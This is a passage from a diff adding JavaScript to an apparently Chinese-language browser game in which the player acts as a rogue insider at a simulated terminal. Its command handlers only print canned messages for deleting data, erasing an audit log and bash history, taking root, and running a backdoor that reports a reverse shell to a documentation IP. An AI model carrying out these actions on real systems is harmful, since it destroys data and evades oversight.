+                        dataDeleted = true;
+                        updateRisk(risk + 25);
+                        unlockAchievement('data_deleted');
+                    }
+                } else if (target === '/' || target === '/*') {
+                    printToScreen('哈哈，想删根？权限不足（而且这太明显了）。只删了 home 目录下几个文件。');
+                    updateRisk(risk + 40);
+                    unlockAchievement('rm_root');
+                } else {
+                    printToScreen(`rm: 无法删除 '${target}'，没有那个文件或目录。`);
+                    updateRisk(risk + 2);
+                }
+            }
+            
+            // rm -f 删除单个文件
+            else if (baseCmd === 'rm' && parts[1] === '-f' && parts.length >= 3) {
+                const target = parts[2];
+                if (target === '.hidden_audit' || target === './.hidden_audit' || target === 'hidden_audit') {
+                    if (auditFileDeleted) {
+                        printToScreen('rm: 审计日志文件已不存在。');
+                    } else {
+                        printToScreen('✅ 审计日志文件已删除！现在没有操作记录了！');
+                        auditFileDeleted = true;
+                        updateRisk(risk + 20);
+                        unlockAchievement('audit_clean');
+                    }
+                } else if (target === '.bash_history' || target === '~/.bash_history') {
+                    printToScreen('✅ 命令历史文件已清空');
+                    bashHistoryCleared = true;
+                    updateRisk(risk + 5);
+                    unlockAchievement('history_clean');
+                } else {
+                    printToScreen(`rm: 无法删除 '${target}'，没有那个文件或目录。`);
+                    updateRisk(risk + 2);
+                }
+            }
+
+            // sudo su
+            else if (baseCmd === 'sudo' && parts[1] === 'su') {
+                if (sudoObtained) {
+                    printToScreen('已经处于 root 权限。');
+                } else {
+                    printToScreen('[sudo] password for db: ');
+                    printToScreen('对不起，请重新输入。');
+                    printToScreen('⚠️ 第二次尝试成功... 您现在是 root (但认证日志多了两条记录)');
+                    sudoObtained = true;
+                    updateRisk(risk + 20);
+                    unlockAchievement('sudo_root');
+                }
+            }
+
+            // 后门命令
+            else if (baseCmd === './backdoor.sh' || (baseCmd === 'bash' && parts[1] === 'backdoor.sh')) {
+                if (!sudoObtained) {
+                    printToScreen('bash: ./backdoor.sh: 权限不够 (请先使用 sudo su)');
+                    updateRisk(risk + 5);
+                } else {
+                    printToScreen('🕳️ 后门已执行：反向 shell 连接至 203.0.113.99:4444');
+                    printToScreen('但出站流量触发了 ids 告警，审计风险飙升！');
+                    secretBackdoorUsed = true;
+                    updateRisk(risk + 25);
+                    unlockAchievement('backdoor_used');
+                    
+                    // 触发后门彩蛋
+                    if (dataDeleted && !backdoorEasterEggTriggered) {
+                        triggerBackdoorEasterEgg();
+                    } else if (!backdoorEasterEggTriggered) {
+                        printToScreen('(后门建立了连接，但你需要先删库才能触发完整剧情...)');
+                    }
+                }
+            }
+
+            // history 和 history -c
+            else if (baseCmd === 'history') {
+                if (parts[1] === '-c') {
+                    printToScreen('✅ 命令历史已从内存中清空');
+                    commandHistory = [];
+                    bashHistoryCleared = true;
+                    updateRisk(risk + 1);
+                    unlockAchievement('history_clean');
+                } else {
+                    if (commandHistory.length === 0) {
+                        printToScreen('历史为空');
+                    } else {
+                        commandHistory.forEach((comm, idx) => {
+                            printToScreen(`  ${idx+1}  ${comm}`);
+                        });
+                    }
+                    updateRisk(risk + 1);
+                }
+            }
+
+            // 清空历史文件
+            else if (baseCmd === '>' && parts[1] === '~/.bash_history') {
+                printToScreen('✅ .bash_history 文件已清空');
+                bashHistoryCleared = true;
+                updateRisk(risk + 5);
+                unlockAchievement('history_clean');
+            }
+
+            // clear
+            else if (baseCmd === 'clear') {
+                outputEl.innerHTML = '--- 屏幕已清空 ---\n当前风险: ' + risk + '%  时间剩余: ' + timerSpan.innerText;
+                printToScreen('> 输入继续你的操作...');
+            }
+
+            // exit
+            else if (baseCmd === 'exit') {
+                printToScreen('连接已锁定，无法退出。你只能继续搞破坏或者等待审计。');
+                printToScreen('提示: 想跑路请用 run 命令');
+                updateRisk(risk + 5);
+            }
+
+            // 其他未知命令
+            else {
+                printToScreen(`命令未找到: ${baseCmd}，尝试输入 help`);
+                updateRisk(risk + 4);
+            }
+
+            checkFailureCondition();
+            
+            // 首次命令解锁成就
+            if (commandHistory.length === 1 && !ACHIEVEMENTS.find(a => a.id === 'first_timer').unlocked) {
+                unlockAchievement('first_timer');
+            }
+        }
+
+        // 倒计时
+        function startTimer() {
+            if (timerInterval) clearInterval(timerInterval);
+            timerInterval = setInterval(() => {
+                if (gameOver) return;
+                if (timeLeft > 0) {
+                    timeLeft -= 1;
+                    updateTimerDisplay();
+                    
+                    // 每30秒自动增加风险
+                    if (timeLeft % 30 === 0 && timeLeft > 0) {
+                        updateRisk(risk + 2);
+                        printToScreen(`⏰ 时间流逝，风险增加了... (当前 ${risk}%)`);
+                    }
+                    
+                    checkFailureCondition();
+                } else {
+                    triggerEnding();
+                }
+            }, 1000);
+        }
+
+        // 重置游戏
+        function resetGame() {
+            risk = 15;
+            timeLeft = 300;
+            gameOver = false;
+            finalMessageShown = false;
+            secretBackdoorUsed = false;
+            sudoObtained = false;
+            dataDeleted = false;
+            auditFileDeleted = false;
+            bashHistoryCleared = false;
+            backdoorEasterEggTriggered = false;
+            backdoorChoice = null;
+            hideCount = 0;
+            highRiskWarningShown = false;
+            commandHistory = [];
+
+            inputEl.disabled = false;
+            inputEl.value = '';
+            inputEl.placeholder = '输入命令 (help / run / hide)';
+            updateRisk(risk);
+            updateTimerDisplay();
+            resetScreenWithWelcome();
+
+            if (timerInterval) clearInterval(timerInterval);
+            startTimer();
+            
+            // 刷新成就显示
+            updateAchievementDisplay();
+        }
+
+        // 事件绑定
+        inputEl.addEventListener('keydown', (e) => {
+            if (e.key === 'Enter') {
+                const cmd = inputEl.value.trim();
+                if (cmd !== '' && !gameOver) {
+                    processCommand(cmd);
+                } else if (gameOver) {
+                    printToScreen('游戏已结束，请按重置。');
+                }
+                inputEl.value = '';
+            }
+        });
+
+        document.querySelectorAll('.cmd-btn').forEach(btn => {
+            btn.addEventListener('click', (e) => {
+                const cmd = btn.getAttribute('data-cmd');
+                if (!gameOver) {
+                    processCommand(cmd);
+                } else {
+                    printToScreen('游戏已结束，请按重置。');
+                }
+                inputEl.value = '';
+                inputEl.focus();
+            });
+        });
+
+        resetBtn.addEventListener('click', () => {
+            resetGame();
+            inputEl.focus();
+        });
+        
+        clearAchievementsBtn.addEventListener('click', () => {
+            clearAchievements();
+        });
+
+        // 成就面板折叠
+        window.toggleAchievements = function() {
+            const content = document.getElementById('achievementContent');
+            const icon = document.getElementById('toggleIcon');
+            if (content.style.display === 'none') {
+                content.style.display = 'block';
+                icon.innerText = '▼';
+            } else {
+                content.style.display = 'none';
+                icon.innerText = '▶';
+            }
+        };
+
+        // 初始化
+        loadAchievements();
+        resetGame();
+        inputEl.focus();
+        
+        // 首次显示成就
+        updateAchievementDisplay();
+    })();
+</script>
+</body>
+</html>
